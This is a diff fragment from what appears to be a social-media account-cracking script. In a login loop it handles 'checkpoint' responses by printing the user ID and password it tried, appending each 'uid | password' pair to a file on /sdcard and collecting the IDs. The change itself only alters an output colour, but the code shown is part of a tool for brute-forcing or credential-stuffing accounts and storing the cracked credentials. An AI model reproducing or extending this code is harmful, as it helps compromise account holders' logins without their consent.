@@ -150,7 +150,7 @@ def test(uid,pwx,tl):
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print(f"\r\33[1;36m[RJ-404-CP] {uid} ¤ {ps}")
+                print(f"\r\33[1;92m[RJ-404-CP] {uid} ¤ {ps}")
                 open('/sdcard/RJ-404-CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(uid)
                 break
